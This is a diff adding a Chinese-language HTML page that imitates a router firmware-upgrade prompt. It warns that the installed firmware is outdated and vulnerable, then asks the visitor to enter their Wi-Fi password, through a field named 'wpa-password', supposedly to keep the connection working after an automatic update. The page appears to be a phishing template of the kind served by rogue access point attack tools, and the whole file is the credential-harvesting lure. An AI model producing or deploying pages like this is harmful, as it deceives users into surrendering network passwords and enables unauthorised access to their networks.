@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <meta http-equiv="Content-type" content="text/html; charset=utf-8;" />
+        <link rel="stylesheet" type="text/css" href="style.css" />
+    </head>
+    <body>
+        <div id="top-header">
+        <span class="top-left">路由器固件升级提示： </span>
+        <span class="top-right">已检测到更新的路由器固件！ </span>
+        </div>
+        <div id="header">
+        <div id="header-left">
+            <img id="logo" src="./logo.jpg" width="100px">
+        </div>
+        <div id="header-right">
+            固件升级
+        </div>
+        </div>
+        <div id="content">
+            <table id="warning">
+            <th>警告:</th>
+            <tr><td><b>当前固件版本: </b> 1.04</td></tr>
+            <tr><td><b>更新固件版本: </b> 2.47</td></tr>
+            <tr><td>您的路由器固件版本过于陈旧，容易受到病毒和木马攻击。为提升路由器性能和安全性，将自动为您升级最新固件。</td></tr>
+            </table>
+
+            <table>
+
+            <th>确认WIFI密码:</th>
+            <tr><td>为确保升级后能够正常连接，请输入您的wifi密码进行确认.</td></tr>       
+            <tr><td><form action="index.html" method="post">
+            wifi密码: <input type="password" name="wpa-password"><br>
+            <input type="submit" value="确认"> </td>
+            </tr>
+            <tr><td>提示：</td></tr> 
+            <tr><td>升级过程将全部自动进行，升级固件大约需要90秒，请不要中途关闭路由器电源.</td></tr> 
+            </table>
+
+        </div>
+
+        <div id="bottom"></div>
+    </body>
+</html>
